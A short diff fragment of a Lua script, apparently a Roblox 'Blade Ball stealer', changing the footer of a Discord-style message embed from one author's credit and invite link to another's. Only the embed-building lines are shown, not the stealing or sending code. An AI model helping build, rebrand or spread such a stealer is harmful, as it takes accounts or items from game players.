@@ -291,7 +291,7 @@ local function SendMessage(list)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Blade Ball stealer by Eblack"
 			}
         }}
     }
